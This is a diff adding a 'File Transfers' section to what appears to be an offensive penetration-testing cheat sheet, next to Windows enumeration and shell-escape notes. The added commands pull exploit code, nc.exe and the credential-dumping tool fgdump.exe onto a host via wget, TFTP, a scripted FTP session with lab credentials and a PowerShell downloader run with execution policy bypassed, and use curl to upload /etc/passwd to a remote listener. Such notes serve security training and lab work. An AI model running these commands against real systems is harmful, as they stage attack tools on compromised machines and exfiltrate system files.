@@ -375,5 +375,44 @@ C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
 
 <a href="https://gtfobins.github.io/#">Escaping Restricted Shells</a>
 
+<div id="File Transfers"> <h3>7. File Transfers</h3></div>
+
+<h4>wget</h4>
+ 
+    wget -O exploit.c 10.10.10.10/exploit.c
+
+<h4>Curl Upload</h4>
+
+    curl --upload-file /etc/passwd http://10.11.0.64:53
+
+<h4>TFTP</h4> 
+
+Local
+
+    atftpd --daemon --port 69 /tftp
+
+Remote
+
+    tftp -i 10.11.0.99 get nc.exe
+
+
+<h4>Windows FTP </h4>
+
+    echo USER>> ftp.txt 
+    echo offsec>>ftp.txt 
+    echo lab123>>ftp.txt
+    echo binary>>ftp.txt
+    echo get nc.exe>> ftp.txt 
+    echo bye>> ftp.txt 
+    ftp -v -n -s:ftp.txt 10.10.10.10
+
+<h4>PowerShell</h4>
+
+    echo $storageDir = $pwd > wget.ps1 
+    echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
+    echo $url = "http://10.10.10.10/fgdump.exe" >>wget.ps1 
+    echo $file = "new.exe" >> wget.ps1
+    echo $webclient.DownloadFile($url,$file) >>wget.ps1
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
 
